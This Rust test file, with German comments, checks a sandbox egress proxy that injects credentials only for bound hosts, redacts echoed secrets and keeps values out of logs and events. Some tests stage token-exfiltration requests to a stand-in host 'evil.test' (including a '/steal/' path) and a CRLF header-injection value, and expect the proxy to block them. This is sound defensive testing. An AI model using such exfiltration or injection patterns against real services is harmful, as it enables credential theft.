//! Credential-Injection (PRX-006), Antwort-Redaction (PRX-010) und Egress-Events (PRX-009)
//! gegen lokale Test-Upstreams (ADR-0033). Die Werte sind Fixtures.

use std::collections::HashMap;
use std::sync::{Arc, Mutex};

use base64::Engine as _;
use beton_core::event::{EgressBlocked, EgressSource};

use super::support::*;
use crate::credentials::{
    Binding, BoxFuture, CredentialAudit, CredentialKind, CredentialSource, Credentials,
    Placeholder, SecretBytes,
};
use crate::egress::{EgressEvents, Traffic};
use crate::proxy::{InstanceSpec, ProxyInstance};
use crate::{Passthrough, PrivateAllowList, RuleSet};

const PUBLIC: &str = "93.184.216.34";
const EVIL: &str = "93.184.216.66";
const TOKEN: &str = "ghp_FIXTUREREALTOKEN0123456789abcdef";

/// Quelle mit festen Werten; zählt die Abrufe.
#[derive(Default)]
struct TestSource {
    values: Mutex<HashMap<String, Result<Vec<u8>, String>>>,
    calls: Mutex<Vec<String>>,
}

impl TestSource {
    fn with(name: &str, value: &str) -> Arc<Self> {
        let s = Self::default();
        s.set(name, Ok(value.as_bytes().to_vec()));
        Arc::new(s)
    }

    fn set(&self, name: &str, v: Result<Vec<u8>, String>) {
        self.values.lock().unwrap().insert(name.into(), v);
    }
}

impl CredentialSource for TestSource {
    fn value<'a>(&'a self, binding: &'a str) -> BoxFuture<'a, Result<SecretBytes, String>> {
        self.calls.lock().unwrap().push(binding.into());
        let v = self.values.lock().unwrap().get(binding).cloned();
        Box::pin(async move {
            match v {
                Some(Ok(v)) => Ok(SecretBytes::new(v)),
                Some(Err(e)) => Err(e),
                None => Err("unbekannt".into()),
            }
        })
    }
}

/// Audit-Empfänger: Nutzung und Fehlgebrauch als Text (für die Prüfung auf Werte).
#[derive(Default)]
struct TestAudit {
    used: Mutex<Vec<(String, String)>>,
    misuse: Mutex<Vec<(Option<String>, String, String)>>,
    fail: std::sync::atomic::AtomicBool,
}

impl CredentialAudit for TestAudit {
    fn used<'a>(&'a self, binding: &'a str, host: &'a str) -> BoxFuture<'a, Result<(), String>> {
        let fail = self.fail.load(std::sync::atomic::Ordering::SeqCst);
        if !fail {
            self.used
                .lock()
                .unwrap()
                .push((binding.into(), host.into()));
        }
        Box::pin(async move {
            if fail {
                Err("Audit nicht erreichbar".into())
            } else {
                Ok(())
            }
        })
    }

    fn misuse<'a>(
        &'a self,
        binding: Option<&'a str>,
        host: &'a str,
        reason: &'a str,
    ) -> BoxFuture<'a, ()> {
        self.misuse
            .lock()
            .unwrap()
            .push((binding.map(str::to_owned), host.into(), reason.into()));
        Box::pin(async {})
    }
}

#[derive(Default)]
struct TestEvents(Mutex<Vec<EgressBlocked>>);

impl EgressEvents for TestEvents {
    fn blocked(&self, event: EgressBlocked) {
        self.0.lock().unwrap().push(event);
    }
}

struct Fx {
    h: Harness,
    github: Upstream,
    api: Upstream,
    evil: Upstream,
    placeholder: Placeholder,
    source: Arc<TestSource>,
    audit: Arc<TestAudit>,
    events: Arc<TestEvents>,
}

fn binding(name: &str, kind: CredentialKind, hosts: &[&str], p: &Placeholder) -> Binding {
    Binding {
        name: name.into(),
        kind,
        hosts: hosts.iter().map(|h| (*h).to_owned()).collect(),
        username: None,
        placeholder: p.clone(),
        implicit: true,
    }
}

async fn fx() -> Fx {
    let h = Harness::new();
    let github = Upstream::tls(h.pki.valid(&["github.com"])).await;
    let api = Upstream::tls(h.pki.valid(&["api.github.com"])).await;
    let evil = Upstream::tls(h.pki.valid(&["evil.test"])).await;
    h.route("github.com", PUBLIC, 443, &github);
    h.route("api.github.com", "93.184.216.35", 443, &api);
    h.route("evil.test", EVIL, 443, &evil);
    h.route("evil.test", EVIL, 80, &evil);
    Fx {
        h,
        github,
        api,
        evil,
        placeholder: Placeholder::generate().unwrap(),
        source: TestSource::with("github", TOKEN),
        audit: Arc::default(),
        events: Arc::default(),
    }
}

impl Fx {
    async fn instance_with(&self, rules: &[&str], bindings: Vec<Binding>) -> ProxyInstance {
        let credentials =
            Credentials::new(bindings, self.source.clone(), self.audit.clone()).unwrap();
        self.h
            .proxy
            .start(InstanceSpec {
                label: "ses_test/tools".into(),
                rules: RuleSet::compile(rules).unwrap(),
                allow_private: PrivateAllowList::default(),
                credentials,
                source: EgressSource::Tools,
                events: Some(self.events.clone()),
                ..InstanceSpec::default()
            })
            .await
            .unwrap()
    }

    async fn instance(&self, rules: &[&str]) -> ProxyInstance {
        let b = binding("github", CredentialKind::Github, &[], &self.placeholder);
        self.instance_with(rules, vec![b]).await
    }

    async fn send(&self, i: &ProxyInstance, host: &str, req: http::Request<Body>) -> Got {
        let mut s = h1(tunnel(&self.h, i, host, 443, &[b"http/1.1"]).await).await;
        collect(s.send_request(req).await.unwrap()).await
    }

    fn ph(&self) -> &str {
        self.placeholder.as_str()
    }
}

fn with_header(mut r: http::Request<Body>, name: &str, value: &str) -> http::Request<Body> {
    r.headers_mut().append(
        http::HeaderName::from_bytes(name.as_bytes()).unwrap(),
        value.parse().unwrap(),
    );
    r
}

fn header(seen: &Seen, name: &str) -> Option<String> {
    seen.headers
        .get(name)
        .and_then(|v| v.to_str().ok())
        .map(str::to_owned)
}

fn b64(s: &str) -> String {
    base64::engine::general_purpose::STANDARD.encode(s)
}

#[tokio::test]
async fn prx_006_ac1_placeholder_is_replaced_for_bound_hosts_in_the_typed_format() {
    let fx = fx().await;
    let i = fx
        .instance(&["* api.github.com/**", "* github.com/**"])
        .await;
    // API: `token <ph>` (wie gh) und `Bearer <ph>`.
    for scheme in ["token", "Bearer"] {
        let r = with_header(
            origin("GET", "api.github.com", "/user"),
            "authorization",
            &format!("{scheme} {}", fx.ph()),
        );
        let got = fx.send(&i, "api.github.com", r).await;
        assert_eq!(got.status, 200, "{}", got.body);
    }
    let seen = fx.api.seen();
    assert_eq!(
        header(&seen[0], "authorization").unwrap(),
        format!("token {TOKEN}")
    );
    assert_eq!(
        header(&seen[1], "authorization").unwrap(),
        format!("Bearer {TOKEN}")
    );
    // Git: Platzhalter als Passwort im Basic-Header (Credential-Helper) → x-access-token.
    let r = with_header(
        origin(
            "GET",
            "github.com",
            "/o/r.git/info/refs?service=git-upload-pack",
        ),
        "authorization",
        &basic("git", fx.ph()),
    );
    let got = fx.send(&i, "github.com", r).await;
    assert_eq!(got.status, 200, "{}", got.body);
    assert_eq!(
        header(&fx.github.seen()[0], "authorization").unwrap(),
        format!("Basic {}", b64(&format!("x-access-token:{TOKEN}")))
    );
    // Die Sandbox sieht den Wert nie: weder die Antwort noch ein Event enthält ihn.
    assert!(!got.body.contains(TOKEN));
    assert!(fx.events.0.lock().unwrap().is_empty());
}

#[tokio::test]
async fn prx_006_ac2_placeholder_for_a_foreign_host_is_403_and_audited_as_misuse() {
    let fx = fx().await;
    let i = fx
        .instance(&[
            "* evil.test/**",
            "* http://evil.test/**",
            "* api.github.com/**",
        ])
        .await;
    let attempts = [
        with_header(
            origin("GET", "evil.test", "/"),
            "authorization",
            &format!("Bearer {}", fx.ph()),
        ),
        with_header(origin("GET", "evil.test", "/"), "x-token", fx.ph()),
        with_header(
            origin("GET", "evil.test", "/"),
            "authorization",
            &basic("x", fx.ph()),
        ),
        origin("GET", "evil.test", &format!("/steal/{}", fx.ph())),
        origin("GET", "evil.test", &format!("/q?t={}", fx.ph())),
    ];
    for r in attempts {
        let got = fx.send(&i, "evil.test", r).await;
        assert_denied(&got, 403, "credential_host_mismatch");
    }
    // Auch über Klartext-HTTP nie (fremder Host bzw. kein TLS).
    let mut r = req("GET", "http://evil.test/");
    r.headers_mut().insert(
        "authorization",
        format!("Bearer {}", fx.ph()).parse().unwrap(),
    );
    r.headers_mut()
        .insert("proxy-authorization", auth(&i).parse().unwrap());
    let got = plain_req(&i, r).await;
    assert_denied(&got, 403, "credential_host_mismatch");
    // Der echte Wert hat den Proxy nie verlassen; der fremde Host hat nichts bekommen.
    assert_eq!(fx.evil.count(), 0);
    assert!(
        fx.source.calls.lock().unwrap().is_empty(),
        "kein Abruf des Werts"
    );
    let misuse = fx.audit.misuse.lock().unwrap().clone();
    assert_eq!(misuse.len(), 6, "{misuse:?}");
    assert!(
        misuse
            .iter()
            .all(|(b, h, _)| b.as_deref() == Some("github") && h == "evil.test"),
        "{misuse:?}"
    );
    assert!(fx.audit.used.lock().unwrap().is_empty());
    let blocked = fx.events.0.lock().unwrap().clone();
    assert_eq!(blocked.len(), 6);
    assert!(
        blocked
            .iter()
            .all(|e| e.reason == "credential_host_mismatch" && e.host == "evil.test")
    );
    // Der Pfad im Event endet ohne Query.
    assert!(blocked.iter().all(|e| !e.path.contains('?')), "{blocked:?}");
}

#[tokio::test]
async fn prx_006_ac3_unknown_valid_placeholder_is_rejected() {
    let fx = fx().await;
    let i = fx.instance(&["* api.github.com/**"]).await;
    let unknown = Placeholder::generate().unwrap();
    let r = with_header(
        origin("GET", "api.github.com", "/user"),
        "authorization",
        &format!("Bearer {unknown}"),
    );
    let got = fx.send(&i, "api.github.com", r).await;
    assert_denied(&got, 403, "credential_unknown");
    assert_eq!(fx.api.count(), 0);
    // Ohne Bindings ist jeder Platzhalter unbekannt.
    let none = fx.instance_with(&["* api.github.com/**"], vec![]).await;
    let r = with_header(
        origin("GET", "api.github.com", "/user"),
        "authorization",
        &format!("Bearer {}", fx.ph()),
    );
    let got = fx.send(&none, "api.github.com", r).await;
    assert_denied(&got, 403, "credential_unknown");
    assert_eq!(fx.api.count(), 0);
    // Kein gültiger Platzhalter (zu kurz, groß) bleibt unverändert und wird weitergeleitet.
    let r = with_header(
        origin("GET", "api.github.com", "/user"),
        "authorization",
        "Bearer bt_cred_ABC",
    );
    assert_eq!(fx.send(&i, "api.github.com", r).await.status, 200);
}

#[tokio::test]
async fn prx_006_url_is_replaced_but_never_the_body_or_a_trace() {
    let fx = fx().await;
    let i = fx.instance(&["* api.github.com/**"]).await;
    let r = origin(
        "GET",
        "api.github.com",
        &format!("/repos/{}?access_token={}&x=1", fx.ph(), fx.ph()),
    );
    let got = fx.send(&i, "api.github.com", r).await;
    assert_eq!(got.status, 200, "{}", got.body);
    assert_eq!(
        fx.api.seen()[0].path_and_query,
        format!("/repos/{TOKEN}?access_token={TOKEN}&x=1")
    );
    // Body bleibt unverändert (der Upstream gibt ihn zurück).
    let body = format!("{{\"token\":\"{}\"}}", fx.ph());
    let r = http::Request::builder()
        .method("POST")
        .uri("/echo-body")
        .header("host", "api.github.com")
        .header("content-length", body.len())
        .body(Body::from(body.clone()))
        .unwrap();
    let got = fx.send(&i, "api.github.com", r).await;
    assert_eq!(got.status, 200);
    assert_eq!(got.body, body);
    assert!(
        header(&fx.api.seen()[1], "authorization").is_some(),
        "implizit injiziert (kein Authorization-Header)"
    );
    // TRACE nie, auch nicht mit Platzhalter.
    let r = with_header(
        origin("TRACE", "api.github.com", "/"),
        "authorization",
        &format!("Bearer {}", fx.ph()),
    );
    let got = fx.send(&i, "api.github.com", r).await;
    assert_eq!(got.status, 403);
    assert_eq!(fx.api.count(), 2);
}

#[tokio::test]
async fn prx_006_implicit_injection_only_without_authorization_and_placeholder() {
    let fx = fx().await;
    let i = fx
        .instance(&["* api.github.com/**", "* github.com/**"])
        .await;
    fx.send(
        &i,
        "api.github.com",
        origin("GET", "api.github.com", "/user"),
    )
    .await;
    fx.send(
        &i,
        "github.com",
        origin("GET", "github.com", "/o/r.git/info/refs"),
    )
    .await;
    let foreign = with_header(
        origin("GET", "api.github.com", "/user"),
        "authorization",
        "Bearer eigenes-token",
    );
    fx.send(&i, "api.github.com", foreign).await;
    let api = fx.api.seen();
    assert_eq!(
        header(&api[0], "authorization").unwrap(),
        format!("Bearer {TOKEN}")
    );
    assert_eq!(
        header(&api[1], "authorization").unwrap(),
        "Bearer eigenes-token"
    );
    assert_eq!(
        header(&fx.github.seen()[0], "authorization").unwrap(),
        format!("Basic {}", b64(&format!("x-access-token:{TOKEN}")))
    );
    // Ohne `implicit` nichts.
    let mut b = binding("github", CredentialKind::Github, &[], &fx.placeholder);
    b.implicit = false;
    let j = fx.instance_with(&["* api.github.com/**"], vec![b]).await;
    fx.send(
        &j,
        "api.github.com",
        origin("GET", "api.github.com", "/user"),
    )
    .await;
    assert!(header(&fx.api.seen()[2], "authorization").is_none());
}

#[tokio::test]
async fn prx_006_other_kinds_and_headers() {
    let fx = fx().await;
    let p2 = Placeholder::generate().unwrap();
    let mut basic_b = binding("reg", CredentialKind::Basic, &["evil.test"], &p2);
    basic_b.username = Some("deploy".into());
    fx.source.set("reg", Ok(b"s3cret-FIXTURE".to_vec()));
    let bearer_b = binding(
        "api",
        CredentialKind::Bearer,
        &["api.github.com"],
        &fx.placeholder,
    );
    fx.source.set("api", Ok(TOKEN.as_bytes().to_vec()));
    let i = fx
        .instance_with(
            &["* api.github.com/**", "* evil.test/**"],
            vec![basic_b, bearer_b],
        )
        .await;
    // `x-api-key` (Anthropic) und `PRIVATE-TOKEN` (GitLab): roh ersetzt.
    let r = with_header(
        origin("GET", "api.github.com", "/v1/models"),
        "x-api-key",
        fx.ph(),
    );
    fx.send(&i, "api.github.com", r).await;
    assert_eq!(header(&fx.api.seen()[0], "x-api-key").unwrap(), TOKEN);
    // basic: `Bearer <ph>` wird zu Basic deploy:<v>.
    let r = with_header(
        origin("GET", "evil.test", "/v2/"),
        "authorization",
        &format!("Bearer {p2}"),
    );
    let got = fx.send(&i, "evil.test", r).await;
    assert_eq!(got.status, 200, "{}", got.body);
    assert_eq!(
        header(&fx.evil.seen()[0], "authorization").unwrap(),
        format!("Basic {}", b64("deploy:s3cret-FIXTURE"))
    );
    assert_eq!(
        fx.audit.used.lock().unwrap().clone(),
        vec![
            ("api".to_owned(), "api.github.com".to_owned()),
            ("reg".to_owned(), "evil.test".to_owned())
        ]
    );
}

#[tokio::test]
async fn prx_006_source_or_audit_failure_is_502_without_any_value() {
    let fx = fx().await;
    let i = fx.instance(&["* api.github.com/**"]).await;
    fx.source.set("github", Err("Kommando scheiterte".into()));
    let r = with_header(
        origin("GET", "api.github.com", "/user"),
        "authorization",
        &format!("token {}", fx.ph()),
    );
    let got = fx.send(&i, "api.github.com", r).await;
    assert_denied(&got, 502, "credential_source_error");
    assert_eq!(fx.api.count(), 0);
    // Audit scheitert: kein Wert im Request (fail closed).
    fx.source.set("github", Ok(TOKEN.as_bytes().to_vec()));
    fx.audit
        .fail
        .store(true, std::sync::atomic::Ordering::SeqCst);
    let r = with_header(
        origin("GET", "api.github.com", "/user"),
        "authorization",
        &format!("token {}", fx.ph()),
    );
    let got = fx.send(&i, "api.github.com", r).await;
    assert_denied(&got, 502, "credential_source_error");
    assert_eq!(fx.api.count(), 0);
    // Ein Wert mit Zeilenumbruch kann keinen Header einschleusen.
    fx.audit
        .fail
        .store(false, std::sync::atomic::Ordering::SeqCst);
    fx.source
        .set("github", Ok(b"abc\r\nX-Injected: 1".to_vec()));
    let r = with_header(
        origin("GET", "api.github.com", "/user"),
        "authorization",
        &format!("token {}", fx.ph()),
    );
    let got = fx.send(&i, "api.github.com", r).await;
    assert_denied(&got, 502, "credential_source_error");
    assert_eq!(fx.api.count(), 0);
}

#[tokio::test]
async fn prx_006_ac6_every_use_is_audited_with_binding_and_host_never_the_value() {
    let fx = fx().await;
    let i = fx.instance(&["* api.github.com/**"]).await;
    for _ in 0..3 {
        let r = with_header(
            origin("GET", "api.github.com", "/user"),
            "authorization",
            &format!("token {}", fx.ph()),
        );
        assert_eq!(fx.send(&i, "api.github.com", r).await.status, 200);
    }
    let used = fx.audit.used.lock().unwrap().clone();
    assert_eq!(used, vec![("github".into(), "api.github.com".into()); 3]);
    assert!(!format!("{used:?}").contains(TOKEN));
}

#[tokio::test]
async fn prx_005_passthrough_never_injects() {
    let fx = fx().await;
    let credentials = Credentials::new(
        vec![binding(
            "github",
            CredentialKind::Github,
            &[],
            &fx.placeholder,
        )],
        fx.source.clone(),
        fx.audit.clone(),
    )
    .unwrap();
    let i =
        fx.h.proxy
            .start(InstanceSpec {
                label: "ses_test/harness".into(),
                passthrough: Passthrough::parse(&["api.github.com"]).unwrap(),
                credentials,
                ..InstanceSpec::default()
            })
            .await
            .unwrap();
    // Der Client spricht TLS direkt mit dem Upstream (Test-PKI), der Proxy sieht nichts.
    let (stream, raw) = connect(&i, "api.github.com:443", Some(&auth(&i))).await;
    assert_eq!(raw.status, 200, "{raw:?}");
    let tls = connector(std::slice::from_ref(&fx.h.pki.ca_der), &[b"http/1.1"])
        .connect(
            rustls::pki_types::ServerName::try_from("api.github.com").unwrap(),
            stream,
        )
        .await
        .unwrap();
    let mut s = h1(tls).await;
    let r = with_header(
        origin("GET", "api.github.com", "/user"),
        "authorization",
        &format!("token {}", fx.ph()),
    );
    let got = collect(s.send_request(r).await.unwrap()).await;
    assert_eq!(got.status, 200);
    assert_eq!(
        header(&fx.api.seen()[0], "authorization").unwrap(),
        format!("token {}", fx.ph())
    );
    assert!(fx.source.calls.lock().unwrap().is_empty());
}

#[tokio::test]
async fn prx_010_ac1_echoed_values_are_replaced_by_the_placeholder() {
    let fx = fx().await;
    let i = fx.instance(&["* api.github.com/**"]).await;
    for path in ["/echo-auth", "/echo-auth/gzip", "/echo-auth/chunked"] {
        let r = with_header(
            origin("GET", "api.github.com", path),
            "authorization",
            &format!("token {}", fx.ph()),
        );
        let got = fx.send(&i, "api.github.com", r).await;
        assert_eq!(got.status, 200, "{path}");
        assert!(!got.body.contains(TOKEN), "{path}: {}", got.body);
        assert!(got.body.contains(fx.ph()), "{path}: {}", got.body);
        assert_eq!(
            got.headers.get("x-echo-auth").unwrap().to_str().unwrap(),
            fx.ph(),
            "{path}"
        );
        assert!(got.headers.get("content-encoding").is_none(), "{path}");
    }
}

#[tokio::test]
async fn prx_010_ac2_binary_and_large_bodies_pass_unchanged() {
    let fx = fx().await;
    let i = fx.instance(&["* api.github.com/**"]).await;
    for path in ["/echo-auth/binary", "/echo-auth/big"] {
        let r = with_header(
            origin("GET", "api.github.com", path),
            "authorization",
            &format!("token {}", fx.ph()),
        );
        let got = fx.send(&i, "api.github.com", r).await;
        assert_eq!(got.status, 200, "{path}");
        // Restrisiko (dokumentiert): unverändert, ohne Pufferung.
        assert!(got.body.contains(TOKEN), "{path}");
        assert!(got.headers.get("content-length").is_some(), "{path}");
        // Header werden trotzdem redigiert.
        assert_eq!(
            got.headers.get("x-echo-auth").unwrap().to_str().unwrap(),
            fx.ph()
        );
    }
}

#[tokio::test]
async fn prx_009_ac1_denied_requests_emit_egress_blocked() {
    let fx = fx().await;
    let i = fx.instance(&["GET api.github.com/repos/**"]).await;
    let got = fx
        .send(
            &i,
            "api.github.com",
            origin("DELETE", "api.github.com", "/repos/o/r?secret=QUERYMARKER"),
        )
        .await;
    assert_denied(&got, 403, "egress_denied");
    let (_s, raw) = connect(&i, "nothing.test:443", Some(&auth(&i))).await;
    assert_eq!(raw.status, 403);
    let blocked = fx.events.0.lock().unwrap().clone();
    assert_eq!(blocked.len(), 2, "{blocked:?}");
    assert_eq!(blocked[0].method, "DELETE");
    assert_eq!(blocked[0].host, "api.github.com");
    assert_eq!(blocked[0].path, "/repos/o/r");
    assert_eq!(blocked[0].reason, "no_matching_rule");
    assert!(blocked[0].rule_hint.is_some());
    assert_eq!(blocked[0].source, EgressSource::Tools);
    assert!(blocked[0].tool_call_id.is_none());
    assert_eq!(blocked[1].method, "CONNECT");
    assert_eq!(blocked[1].host, "nothing.test");
}

/// Sammelt alle Log-Zeilen (alle Crates, TRACE) in einen Puffer.
#[derive(Clone, Default)]
struct Captured(Arc<Mutex<Vec<u8>>>);

impl std::io::Write for Captured {
    fn write(&mut self, buf: &[u8]) -> std::io::Result<usize> {
        self.0.lock().unwrap().extend_from_slice(buf);
        Ok(buf.len())
    }

    fn flush(&mut self) -> std::io::Result<()> {
        Ok(())
    }
}

impl<'a> tracing_subscriber::fmt::MakeWriter<'a> for Captured {
    type Writer = Captured;

    fn make_writer(&'a self) -> Self::Writer {
        self.clone()
    }
}

#[tokio::test(flavor = "current_thread")]
async fn prx_009_ac2_logs_and_events_never_contain_header_cookie_or_query_values() {
    let logs = Captured::default();
    let subscriber = tracing_subscriber::fmt()
        .with_max_level(tracing::Level::TRACE)
        .with_writer(logs.clone())
        .with_ansi(false)
        .finish();
    let _guard = tracing::subscriber::set_default(subscriber);
    let fx = fx().await;
    let traffic = Traffic::default();
    let credentials = Credentials::new(
        vec![binding(
            "github",
            CredentialKind::Github,
            &[],
            &fx.placeholder,
        )],
        fx.source.clone(),
        fx.audit.clone(),
    )
    .unwrap();
    let i =
        fx.h.proxy
            .start(InstanceSpec {
                label: "ses_test/tools".into(),
                rules: RuleSet::compile(&["GET api.github.com/**", "* evil.test/**"]).unwrap(),
                credentials,
                events: Some(fx.events.clone()),
                traffic: Some(traffic.clone()),
                ..InstanceSpec::default()
            })
            .await
            .unwrap();
    let marked = |method: &str, host: &str, path: &str| {
        let r = with_header(origin(method, host, path), "cookie", "session=COOKIEMARKER");
        with_header(r, "x-custom", "HEADERMARKER")
    };
    // Erlaubt (mit Injektion), abgelehnt (Methode), Fehlgebrauch und Platzhalter in der Query.
    let r = with_header(
        marked("GET", "api.github.com", "/echo-auth?q=QUERYMARKER"),
        "authorization",
        &format!("token {}", fx.ph()),
    );
    fx.send(&i, "api.github.com", r).await;
    fx.send(
        &i,
        "api.github.com",
        marked("POST", "api.github.com", "/x?q=QUERYMARKER"),
    )
    .await;
    let r = with_header(
        marked("GET", "evil.test", "/?q=QUERYMARKER"),
        "authorization",
        "Bearer AUTHMARKER",
    );
    fx.send(&i, "evil.test", r).await;
    let r = with_header(
        marked("GET", "evil.test", "/x"),
        "authorization",
        &format!("Bearer {}", fx.ph()),
    );
    fx.send(&i, "evil.test", r).await;
    drop(i);
    let summary = traffic.take();
    let text = String::from_utf8_lossy(&logs.0.lock().unwrap()).into_owned();
    let events = format!("{:?} {summary:?}", fx.events.0.lock().unwrap());
    assert!(text.contains("Egress"), "Logs fehlen: {text}");
    for marker in [
        "COOKIEMARKER",
        "HEADERMARKER",
        "QUERYMARKER",
        "AUTHMARKER",
        TOKEN,
    ] {
        assert!(!text.contains(marker), "{marker} im Log:\n{text}");
        assert!(!events.contains(marker), "{marker} in Events: {events}");
    }
    assert!(
        summary
            .iter()
            .any(|h| h.host == "api.github.com" && h.requests == 1)
    );
}
